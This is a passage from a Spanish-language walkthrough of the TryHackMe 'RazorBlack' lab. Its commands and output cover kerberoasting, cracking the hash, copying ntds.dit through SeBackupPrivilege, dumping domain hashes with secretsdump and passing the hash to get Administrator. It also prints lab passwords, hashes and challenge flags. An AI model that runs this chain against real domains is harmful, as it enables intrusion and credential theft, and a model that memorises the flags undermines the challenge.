d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:16 AM           1692 lvetrova.xml

PS C:\Users\lvetrova> </span><span class="am">type </span><span class="p">lvetrova.xml
&ltObjs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  &ltObj RefId="0">
    &ltTN RefId="0">
      &ltT>System.Management.Automation.PSCredential&lt/T>
      &ltT>System.Object&lt/T>
    &lt/TN>
    &ltToString>System.Management.Automation.PSCredential&lt/ToString>
    &ltProps>
      &ltS N="UserName">Your Flag is here =&gt;&lt/S>
      &ltSS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d&lt/SS>  
    &lt/Props>
  &lt/Obj>
&lt/Objs>
PS C:\Users\lvetrova></span>
</code></pre></div></div><br>

<p class="plain-text">Podemos cargar el <code class="language-plaintext highlighter-rouge">xml</code> y obtener la credencial en la variable <code class="language-plaintext highlighter-rouge">$Cred</code>, de la variable seleccionamos los valores <code class="language-plaintext highlighter-rouge">UserName</code> y <code class="language-plaintext highlighter-rouge">Password</code>, ahora podemos ver la <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\lvetrova> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">Import-Clixml </span><span class="c1">-Path </span><span class="p">lvetrova.xml
PS C:\Users\lvetrova> </span><span class="ve">$Cred</span><span class="p">.GetNetworkCredential() | </span><span class="am">Select </span><span class="p">UserName,Password  

UserName             Password
--------             --------
Your Flag is here => THM{694362e877adef0d85a92e6d17551fe4}

PS C:\Users\lvetrova></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-xyan1d3">
<br><h3 class="post-title">Shell - xyan1d3</h3><br>

<p class="plain-text">Para poder enumerar <code class="language-plaintext highlighter-rouge">privilegios</code> e información del <code class="language-plaintext highlighter-rouge">dominio</code> podemos subir el módulo de <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound.ps1</a> e importarlo en la <code class="language-plaintext highlighter-rouge">powershell</code> para usar sus funciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\lvetrova\Documents> </span><span class="am">upload </span><span class="p">SharpHound.ps1
</span><span class="az">
Info: Uploading SharpHound.ps1 to C:\Users\lvetrova\Documents\SharpHound.ps1  
</span><span class="sa">
Data: 1757460 bytes of 1757460 bytes copied
</span><span class="az">
Info: Upload successful!
</span><span class="p">
PS C:\Users\lvetrova\Documents> </span><span class="am">Import-Module</span><span class="p"> .\SharpHound.ps1
PS C:\Users\lvetrova\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">Invocamos bloodhound indicando que queremos enumerar todo, al terminar esto nos creara un <code class="language-plaintext highlighter-rouge">zip</code> con la información que podemos descargar con la función <code class="language-plaintext highlighter-rouge">download</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\lvetrova\Documents> </span><span class="am">Invoke-Bloodhound </span><span class="c1">-CollectionMethod </span><span class="p">All
PS C:\Users\lvetrova\Documents> </span><span class="am">dir</span><span class="p">

    Directory: C:\Users\lvetrova\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/11/2023  10:04 PM          11661 20230511220419_BloodHound.zip
-a----        5/11/2023   9:46 PM        1318097 SharpHound.ps1

PS C:\Users\lvetrova\Documents> </span><span class="am">download </span><span class="p">20230511220419_BloodHound.zip BH.zip
</span><span class="az">
Info: Downloading C:\Users\lvetrova\Documents\20230511220419_BloodHound.zip to BH.zip  

Info: Download successful!
</span><span class="p">
PS C:\Users\lvetrova\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">Subimos el zip a <code class="language-plaintext highlighter-rouge">bloodhound</code> y al listar las cuentas del dominio <code class="language-plaintext highlighter-rouge">kerberoasteables</code> encontramos a el usuario <code class="language-plaintext highlighter-rouge">xyan1d3</code> además del tipico krbtgt que viene por defecto</p>
<a href="/tryhackme/razorblack/2.png" target="_blank"><div><p><img src="/tryhackme/razorblack/2.png"></p></div></a>

<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">GetUserSPNs</code> con las <code class="language-plaintext highlighter-rouge">credenciales</code> de el usuario ltrova o cualquiera de las <code class="language-plaintext highlighter-rouge">3</code> que tenemos para hacer una petición y ver el <code class="language-plaintext highlighter-rouge">hash</code> del usuario <code class="language-plaintext highlighter-rouge">xyan1d3</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ impacket-GetUserSPNs </span><span class="p">raz0rblack.thm/lvetrova -hashes :f220d3988deb3f516c73f40ee16c431d -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>               

$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$76f40957d6006a44aff9be824bb11b50$72498e93c1fd6d9044a765c54213efd1cec2978dc6e83dd991efc3516bbbae13a011fbbb42e4da014fca844c34530236ced8742a55346ea3ef421187bb4f0fb865ed73a09fb0622596d6477d84b259c7d71fe6ee02db9351928172839e23511adcd0bb8c94a4494799d4893a0447850fef1ca4c0f787925eceab4ae9b3ef004b8c8e7ae8c3086cd202eef20c475edb77a41604758db2fed5f8e90f48fdd26ad04bc87ea87d2a742d96fdba000f9d8702aa72a2a07917db05a15cc6b0c3c8e02b22647b409e56a9d55c778724c8a2c410611228cf47f8f2dc8080f458c4afc328793c3d819ead01565280217643c3d3d038d091a27e30eff3bde704fc62a45c6aa9c49bf3f8f63a8c6218b9ffd92e2ade59026fb5864806dd169fa8f2d1915f837bbe0725d3a501505e00a9092f0785f80ec7a756c5059b0a21a3e46e7fab49b58766db1e69a80432e92548647e8e202e35284c058ce3161bd01de42644ba8e89a711f3fd88ec89b54f366947d581790e30d730f2b5dfdfde16c9d6165be306f379d64b80b9643270a7fb4fce43282c1d0b001dd71ce6d8980b5085ae4b08a1bded72d01a66f8fb4c47b4623d4fd6e296642c54430a705db850b8e0be93c2909b9623e3cadaf6dffd0e4aa8425999f2c0397d0c745880ad9db6f65f8a0d6f8935f617946c70e9707de0f40727a31b25d5fb8e423aa3c0ee68fdc4c6c645083a9e7376be5b61e7040c70b44350de288c67e68e469945fe1f4ce44b6323ef0c633a0df6b797bc7a9072cd201650f9c5c5e1dfdac755a935a2f37aafd3c33c3dc388dd0d2951c6eaf3ecc4121959b0918eb22a7d0aded24cefd1774aa4dc55b76b259ed48e3aabf2963d1f1648352c4714fa88d77e99b133695105f5e2e50aa961e8f8645f2439e0d94da2356122632d55323537410405dab5fd066ea9678469afebb90ad790f4fbcf636224c47f514b0c12dfe3dcaf5b06aefef2be5b813c75ae3e236fcb2df42a1ab1007b3da6141d5a23c464485a3f49ed3acf4795664a8cb89d8546dc113bdd012a48b4c84e52b98799312f6833d1a7bb1fd3b48920fa4365c5d4a969e068556ee2f1d1e159773aed385fb1743635c4bcb16e2fdb63f8ceec248f931a2974e6d4387963fcf56e7bcec3f3a4bd2c11df9d2e98b09386164388d98860569aa0b1a941bc0b8f372adebbd9b18fc2f21cbc9e88188cb5d39c8ae92c09fdab894a57149726f890b55b2a31f9a5d9b2f010b856bb14e48d056149d83baf21023090abaf98421bd9a17556e887bde64c9011e57687c4fee021c87548aa4447ccaa560b5d4aff842f10e8b9f3098b5711559aa9d956910aaf7fedf08ec173b309b4b7f972349aa65d6ead354e68fc54bc2f6a4f66ecbdafa54fa3f653acfda10efe50ccc3f2aa3b719abc112e  </span>
</code></pre></div></div><br>

<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">john</code> podemos romper el hash facilmente y ver la contraseña de <code class="language-plaintext highlighter-rouge">xyan1d3</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])  
Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class="am">cyanide9amine5628</span><span class="p"> (</span><span class="am">?</span><span class="p">)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.</span>
</code></pre></div></div><br>

<p class="plain-text">Las comprobamos con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y son validas tanto para smb como para <code class="language-plaintext highlighter-rouge">winrm</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ crackmapexec </span><span class="p">smb raz0rblack.thm -u xyan1d3 -p cyanide9amine5628
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)  
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  445    HAVEN-DC         </span><span class="ve">[+] </span><span class="p">raz0rblack.thm\xyan1d3:cyanide9amine5628 

</span><span class="ve">❯ crackmapexec </span><span class="p">winrm raz0rblack.thm -u xyan1d3 -p cyanide9amine5628
</span><span class="az">SMB         </span><span class="p">raz0rblack.thm  5985   HAVEN-DC         </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:HAVEN-DC) (domain:raz0rblack.thm)
</span><span class="az">HTTP        </span><span class="p">raz0rblack.thm  5985   HAVEN-DC         </span><span class="az">[*] </span><span class="p">http://raz0rblack.thm:5985/wsman
</span><span class="az">WINRM       </span><span class="p">raz0rblack.thm  5985   HAVEN-DC         </span><span class="ve">[+] </span><span class="p">raz0rblack.thm\xyan1d3:cyanide9amine5628 </span><span class="am">(Pwn3d!)</span>
</code></pre></div></div><br>

<p class="plain-text">Nuevamente nos podemos conectar a la maquina <code class="language-plaintext highlighter-rouge">evil-winrm</code> y obtener una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ evil-winrm</span><span class="p"> -i raz0rblack.thm -u xyan1d3 -p cyanide9amine5628  
PS C:\Users\xyan1d3\Documents> </span><span class="am">whoami</span><span class="p">
raz0rblack\xyan1d3
PS C:\Users\xyan1d3\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">Nuevamente encontramos un <code class="language-plaintext highlighter-rouge">xml</code>, solo repetimos el procedimiento para ver la <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\xyan1d3> </span><span class="am">dir</span><span class="p">

    Directory: C:\Users\xyan1d3

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021   9:34 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml

PS C:\Users\xyan1d3> </span><span class="am">type </span><span class="p">xyan1d3.xml
&ltObjs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  &ltObj RefId="0">
    &ltTN RefId="0">
      &ltT>System.Management.Automation.PSCredential&lt/T>
      &ltT>System.Object&lt/T>
    &lt/TN>
    &ltToString>System.Management.Automation.PSCredential&lt/ToString>
    &ltProps>
      &ltS N="UserName">Nope your flag is not here&lt/S>
      &ltSS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2&lt/SS>  
    &lt/Props>
  &lt/Obj>
&lt/Objs>
PS C:\Users\xyan1d3> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">Import-Clixml </span><span class="c1">-Path </span><span class="p">xyan1d3.xml
PS C:\Users\xyan1d3> </span><span class="ve">$Cred</span><span class="p">.GetNetworkCredential() | </span><span class="am">Select </span><span class="p">UserName,Password

UserName                   Password
--------                   --------
Nope your flag is not here LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}  

PS C:\Users\xyan1d3></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-administrator">
<br><h3 class="post-title">Shell - Administrator</h3><br>

<p class="plain-text">Entre los privilegios del usuario podemos ver el privilegio <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code> habilitado, esta explotación será exactamente la misma que en en endgame <a href="/endgames/xen/#flag6">XEN</a></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\xyan1d3> </span><span class="am">whoami </span><span class="p">/priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

PS C:\Users\xyan1d3></span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo no tenemos una consola completamente <code class="language-plaintext highlighter-rouge">interactiva</code> para poder usar <code class="language-plaintext highlighter-rouge">diskshadow</code>, asi que crearemos un <code class="language-plaintext highlighter-rouge">txt</code> con todos los comendos que este ejecutará</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ cat </span><span class="p">cmd.txt
set context persistent nowriters 
add volume C: alias xyz 
set metadata C:\ProgramData\xyz.cab 
create 
expose %xyz% X: </span>
</code></pre></div></div><br>

<p class="plain-text">Subimos el txt y con <code class="language-plaintext highlighter-rouge">diskshadow</code> usando el parametro <code class="language-plaintext highlighter-rouge">/s</code> indicamos el archivo, este ejecutara los comando que definimos para crear la copia <code class="language-plaintext highlighter-rouge">xyz</code> y exponerla en <code class="language-plaintext highlighter-rouge">X:</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="am">diskshadow </span><span class="p">/s cmd.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  HAVEN-DC,  5/11/2023 10:09:10 PM

-> set context persistent nowriters
-> add volume C: alias xyz
-> set metadata C:\ProgramData\xyz.cab
-> create
Alias xyz for shadow ID {c93ddbda-2e97-4022-bbcb-d481ee4414c0} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {8d6f4001-e40e-473a-ade5-21a2857c9eb6} set as environment variable.  

Querying all shadow copies with the shadow copy set ID {8d6f4001-e40e-473a-ade5-21a2857c9eb6}

	* Shadow copy ID = {c93ddbda-2e97-4022-bbcb-d481ee4414c0}		%xyz%
		- Shadow copy set: {8d6f4001-e40e-473a-ade5-21a2857c9eb6}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 5/11/2023 10:09:14 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: HAVEN-DC.raz0rblack.thm
		- Service machine: HAVEN-DC.raz0rblack.thm
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %xyz% X:
-> %xyz% = {c93ddbda-2e97-4022-bbcb-d481ee4414c0}
The shadow copy was successfully exposed as X:\.
->
PS C:\ProgramData></span>
</code></pre></div></div><br>

<p class="plain-text">Con la función <code class="language-plaintext highlighter-rouge">upload</code> incluida en <code class="language-plaintext highlighter-rouge">evil-winrm</code> podemos subir un par de <a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">dlls</a> que nos ayudaran a explotar este <code class="language-plaintext highlighter-rouge">privilegio</code>, después los importamos como <code class="language-plaintext highlighter-rouge">modulos</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="am">upload </span><span class="p">SeBackupPrivilegeUtils.dll
</span><span class="az">
Info: Uploading SeBackupPrivilegeUtils.dll to C:\ProgramData\SeBackupPrivilegeUtils.dll
</span><span class="sa">
Data: 21844 bytes of 21844 bytes copied
</span><span class="az">
Info: Upload successful!
</span><span class="p">
PS C:\ProgramData> </span><span class="am">upload </span><span class="p">SeBackupPrivilegeCmdLets.dll
</span><span class="az">
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\ProgramData\SeBackupPrivilegeCmdLets.dll  
</span><span class="sa">
Data: 16384 bytes of 16384 bytes copied
</span><span class="az">
Info: Upload successful!
</span><span class="p">
PS C:\ProgramData> </span><span class="am">Import-Module </span><span class="p">.\SeBackupPrivilegeUtils.dll
PS C:\ProgramData> </span><span class="am">Import-Module </span><span class="p">.\SeBackupPrivilegeCmdLets.dll
PS C:\ProgramData></span>
</code></pre></div></div><br>

<p class="plain-text">Ahora copiamos los archivos <code class="language-plaintext highlighter-rouge">ntds.dit</code> que contiene los <code class="language-plaintext highlighter-rouge">hashes</code> de todos los usuarios del dominio y <code class="language-plaintext highlighter-rouge">SYSTEM</code> de la copia creada accediendo desde la unidad <code class="language-plaintext highlighter-rouge">X:</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="am">Copy-FileSeBackupPrivilege </span><span class="p">X:\Windows\NTDS\ntds.dit ntds.dit
PS C:\ProgramData> </span><span class="am">Copy-FileSeBackupPrivilege </span><span class="p">X:\Windows\System32\Config\SYSTEM SYSTEM  
PS C:\ProgramData></span>
</code></pre></div></div><br>

<p class="plain-text">Podemos conectarnos con <code class="language-plaintext highlighter-rouge">smbclient</code> de <code class="language-plaintext highlighter-rouge">impacket</code> y usando el recurso <code class="language-plaintext highlighter-rouge">C$</code>, entrar a la carpeta <code class="language-plaintext highlighter-rouge">ProgramData</code> donde tenemos nuestros archivos y descargarlos con <code class="language-plaintext highlighter-rouge">get</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ impacket-smbclient </span><span class="p">raz0rblack.thm/xyan1d3:cyanide9amine5628@10.10.235.231  
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# use C$
# cd ProgramData
# get SYSTEM
# get ntds.dit
#</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora en local con la herramienta <code class="language-plaintext highlighter-rouge">secretsdump</code> de <code class="language-plaintext highlighter-rouge">impacket</code>, le pasamos el <code class="language-plaintext highlighter-rouge">SYSTEM</code> y el <code class="language-plaintext highlighter-rouge">ntds.dit</code> que hemos descargado dumpeamos todos los <code class="language-plaintext highlighter-rouge">hashes</code> del dominio</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ impacket-secretsdump </span><span class="p">LOCAL -system SYSTEM -ntds ntds.dit
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0xf1582a79dd00631b701d3d15e75e59f6
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: f6162bb347993035d66a15417d73a667
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:0ae0e528447968f809c68e7d7363bd8d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf
Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8
Administrator:des-cbc-md5:d3b646b65bceb5c7
HAVEN-DC$:aes256-cts-hmac-sha1-96:c060b6e232cb8055b2b032db367fefd4526c949be19846526a734dda83f1fb1a
HAVEN-DC$:aes128-cts-hmac-sha1-96:ee6f53f26d3d8ed81d59d7eda1d3ea2c
HAVEN-DC$:des-cbc-md5:34fb7c15102ce6b3
krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5
krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb
krbtgt:des-cbc-md5:857a46f13e91eae3
raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f
raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61
raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975
raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39
raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839
raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6
raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:f790d6a749689497468b1eae5fa26bfa842446088115a4edc59730ee2d76436b
raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:ffb39df24f1f980a096e14bca1a7fc33
raz0rblack.thm\sbradley:des-cbc-md5:409e45adf8dfe5a1
raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559  
raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a
raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07
[*] Cleaning up...</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora simplemente nos conectamos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> como <code class="language-plaintext highlighter-rouge">Administrator</code> haciendo un <code class="language-plaintext highlighter-rouge">passthehash</code> para poder obtener una <code class="language-plaintext highlighter-rouge">powershell</code> en la máquina</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ evil-winrm </span><span class="p">-i raz0rblack.thm -u Administrator -H 9689931bed40ca5a2ce1218210177f0c  
PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
raz0rblack\administrator
PS C:\Users\Administrator\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">En su home podemos ver un <code class="language-plaintext highlighter-rouge">xml</code> sin embargo esta vez no es una <code class="language-plaintext highlighter-rouge">credencial</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\Administrator> </span><span class="am">dir</span><span class="p">

    Directory: C:\Users\Administrator

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/21/2021   9:45 AM                3D Objects
d-r---        5/21/2021   9:45 AM                Contacts
d-r---        5/21/2021   9:45 AM                Desktop
d-r---        5/21/2021   9:45 AM                Documents
d-r---        5/21/2021   9:45 AM                Downloads
d-r---        5/21/2021   9:45 AM                Favorites
d-r---        5/21/2021   9:45 AM                Links
d-r---        5/21/2021   9:45 AM                Music
d-r---        5/21/2021   9:45 AM                Pictures
d-r---        5/21/2021   9:45 AM                Saved Games
d-r---        5/21/2021   9:45 AM                Searches
d-r---        5/21/2021   9:45 AM                Videos
-a----        2/25/2021   1:08 PM            290 cookie.json
-a----        2/25/2021   1:12 PM           2512 root.xml

PS C:\Users\Administrator> </span><span class="am">type </span><span class="p">root.xml
&ltObjs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  &ltObj RefId="0">
    &ltTN RefId="0">
      &ltT>System.Management.Automation.PSCredential&lt/T>
      &ltT>System.Object&lt/T>
    &lt/TN>
    &ltToString>System.Management.Automation.PSCredential&lt/ToString>
    &ltProps>
      &ltS N="UserName">Administrator&lt/S>
      &ltSS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a&lt/SS>  
  &lt/Obj>
&lt/Objs>
PS C:\Users\Administrator></span>
</code></pre></div></div><br>

<p class="plain-text">La cadena es solo <code class="language-plaintext highlighter-rouge">hexadecimal</code>, lo decodeamos con <code class="language-plaintext highlighter-rouge">xxd</code> y podemos ver la <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ echo </span><span class="p">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a | </span><span class="ve">xxd</span><span class="p"> -ps -r  
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
THM{1b4f46cc4fba46348273d18dc91da20d}

Tag me on https://twitter.com/Xyan1d3 about what part you enjoyed on this box and what part you struggled with.

If you enjoyed this box you may also take a look at the linuxagency room in tryhackme.
Which contains some linux fundamentals and privilege escalation https://tryhackme.com/room/linuxagency.</span>
</code></pre></div></div><br>

<p class="plain-text">En el directorio home del usuario <code class="language-plaintext highlighter-rouge">twilliams</code> podemos ver un archivo <code class="language-plaintext highlighter-rouge">exe</code> con nombre bastante largo, podemos indicar que empieza con <code class="language-plaintext highlighter-rouge">def</code> y <code class="language-plaintext highlighter-rouge">*</code> para acortarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\twilliams> </span><span class="am">dir</span><span class="p">

    Directory: C:\Users\twilliams

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:18 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
